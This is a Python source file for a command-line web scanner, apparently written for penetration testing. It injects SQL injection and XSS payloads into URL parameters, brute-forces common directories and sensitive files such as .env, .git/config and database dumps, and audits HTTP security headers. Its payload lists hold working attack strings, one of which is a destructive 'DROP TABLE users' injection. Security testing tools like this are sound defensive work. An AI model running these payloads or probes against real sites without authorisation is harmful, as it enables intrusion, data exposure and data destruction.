#!/usr/bin/env python3
"""
Web Application Scanner for Elysia Pentesting
SQL injection, XSS, CSRF, directory brute forcing.
"""
import socket
import json
import re
import sys
from typing import Dict, Any, List
from pathlib import Path
from datetime import datetime
from urllib.parse import quote


class SQLInjectionScanner:
    """Detect SQL injection vulnerabilities."""

    PAYLOADS = [
        "'", "1' OR '1'='1", "1' OR '1'='1'--", "1' UNION SELECT NULL--",
        "' OR ''='", "admin'--", "' UNION SELECT 1,2,3--",
        "1; DROP TABLE users--", "' OR 1=1#", "1' AND '1'='1"
    ]

    ERROR_PATTERNS = [
        r"SQL syntax", r"mysql_", r"ORA-\d{5}", r"PostgreSQL",
        r"sqlite3", r"Microsoft SQL", r"Unclosed quotation",
        r"SQL command not properly ended", r"unterminated string"
    ]

    def __init__(self):
        self.findings = []

    def test_url(self, url: str, param: str) -> List[Dict[str, Any]]:
        vulnerabilities = []
        for payload in self.PAYLOADS:
            test_url = url.replace(f"={param}", f"={quote(payload)}")
            try:
                import urllib.request
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    response = resp.read().decode("utf-8", errors="ignore")
                    for pattern in self.ERROR_PATTERNS:
                        if re.search(pattern, response, re.IGNORECASE):
                            vuln = {
                                "url": url, "param": param, "payload": payload,
                                "evidence": pattern, "severity": "CRITICAL",
                                "type": "SQL Injection",
                                "timestamp": datetime.now().isoformat()
                            }
                            vulnerabilities.append(vuln)
                            self.findings.append(vuln)
                            break
            except Exception:
                pass
        return vulnerabilities

    def test_forms(self, url: str, form_params: List[str]) -> List[Dict[str, Any]]:
        all_vulns = []
        for param in form_params:
            vulns = self.test_url(url, param)
            all_vulns.extend(vulns)
        return all_vulns


class XSSScanner:
    """Detect Cross-Site Scripting vulnerabilities."""

    PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "'-alert('XSS')-'",
        "\"><script>alert('XSS')</script>",
        "{{7*7}}", "${7*7}"
    ]

    def __init__(self):
        self.findings = []

    def test_url(self, url: str, param: str) -> List[Dict[str, Any]]:
        vulnerabilities = []
        for payload in self.PAYLOADS:
            test_url = url.replace(f"={param}", f"={quote(payload)}")
            try:
                import urllib.request
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    response = resp.read().decode("utf-8", errors="ignore")
                    if payload in response and "<script>" in payload.lower():
                        vuln = {
                            "url": url, "param": param, "payload": payload,
                            "severity": "HIGH", "type": "Reflected XSS",
                            "timestamp": datetime.now().isoformat()
                        }
                        vulnerabilities.append(vuln)
                        self.findings.append(vuln)
            except Exception:
                pass
        return vulnerabilities

    def check_headers(self, url: str) -> List[Dict[str, Any]]:
        issues = []
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                headers = dict(resp.headers)
                if "X-XSS-Protection" not in headers:
                    issues.append({"issue": "Missing X-XSS-Protection header", "severity": "MEDIUM"})
                if "Content-Security-Policy" not in headers:
                    issues.append({"issue": "Missing Content-Security-Policy header", "severity": "MEDIUM"})
                if headers.get("X-Frame-Options") not in ["DENY", "SAMEORIGIN", None]:
                    issues.append({"issue": "Weak X-Frame-Options", "severity": "LOW"})
        except Exception:
            pass
        return issues


class DirectoryBruteForcer:
    """Directory and file brute forcing."""

    COMMON_DIRS = [
        "admin", "backup", "config", "data", "db", "debug", "dev",
        "files", "images", "img", "includes", "js", "css", "lib",
        "logs", "media", "modules", "private", "public", "scripts",
        "src", "static", "temp", "tmp", "uploads", "vendor", "wp-admin"
    ]

    COMMON_FILES = [
        ".env", ".git/config", ".htaccess", "config.php", "wp-config.php",
        "web.config", "server-status", "phpinfo.php", "info.php",
        "backup.sql", "database.sql", "dump.sql", "robots.txt",
        "sitemap.xml", ".DS_Store", "crossdomain.xml"
    ]

    def __init__(self):
        self.found = []

    def scan(self, host: str, port: int = 80, use_ssl: bool = False) -> List[Dict[str, Any]]:
        scheme = "https" if use_ssl else "http"
        all_paths = self.COMMON_DIRS + self.COMMON_FILES

        for path in all_paths:
            url = f"{scheme}://{host}:{port}/{path}"
            try:
                import urllib.request
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    if resp.status == 200:
                        self.found.append({
                            "url": url, "status": resp.status,
                            "size": len(resp.read()),
                            "severity": "HIGH" if path.startswith(".") else "MEDIUM"
                        })
                        print(f"  [FOUND] {url}")
            except Exception:
                pass
        return self.found


class SecurityHeaderAnalyzer:
    """Analyze HTTP security headers."""

    SECURITY_HEADERS = {
        "Strict-Transport-Security": {"severity": "HIGH", "description": "HSTS not set"},
        "X-Content-Type-Options": {"severity": "MEDIUM", "description": "Missing nosniff"},
        "X-Frame-Options": {"severity": "MEDIUM", "description": "Missing frame protection"},
        "X-XSS-Protection": {"severity": "LOW", "description": "Missing XSS protection"},
        "Content-Security-Policy": {"severity": "HIGH", "description": "No CSP configured"},
        "Referrer-Policy": {"severity": "LOW", "description": "No referrer policy"},
        "Permissions-Policy": {"severity": "LOW", "description": "No permissions policy"}
    }

    def analyze(self, url: str) -> Dict[str, Any]:
        results = {"url": url, "headers_present": [], "headers_missing": [], "issues": []}
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                headers = dict(resp.headers)
                for header, info in self.SECURITY_HEADERS.items():
                    if header in headers:
                        results["headers_present"].append(header)
                    else:
                        results["headers_missing"].append(header)
                        results["issues"].append({
                            "header": header, "severity": info["severity"],
                            "description": info["description"]
                        })
        except Exception as e:
            results["error"] = str(e)
        return results


def main():
    if len(sys.argv) < 3:
        print("Web Scanner")
        print("=" * 40)
        print("\nCommands:")
        print("  sql <url> <param>     - SQL injection test")
        print("  xss <url> <param>     - XSS test")
        print("  dirs <host> [port]    - Directory brute force")
        print("  headers <url>         - Security header analysis")
        sys.exit(0)

    cmd = sys.argv[1]

    if cmd == "sql" and len(sys.argv) >= 4:
        scanner = SQLInjectionScanner()
        vulns = scanner.test_url(sys.argv[2], sys.argv[3])
        for v in vulns:
            print(f"  [{v['severity']}] {v['type']}: {v['payload']}")

    elif cmd == "xss" and len(sys.argv) >= 4:
        scanner = XSSScanner()
        vulns = scanner.test_url(sys.argv[2], sys.argv[3])
        for v in vulns:
            print(f"  [{v['severity']}] {v['type']}: {v['payload']}")

    elif cmd == "dirs" and len(sys.argv) >= 3:
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 80
        brute = DirectoryBruteForcer()
        found = brute.scan(sys.argv[2], port)
        print(f"\nFound {len(found)} items")

    elif cmd == "headers" and len(sys.argv) >= 3:
        analyzer = SecurityHeaderAnalyzer()
        results = analyzer.analyze(sys.argv[2])
        print(f"\nHeaders present: {len(results['headers_present'])}")
        print(f"Headers missing: {len(results['headers_missing'])}")
        for issue in results.get("issues", []):
            print(f"  [{issue['severity']}] {issue['description']}")

    else:
        print("Unknown command")


if __name__ == "__main__":
    main()
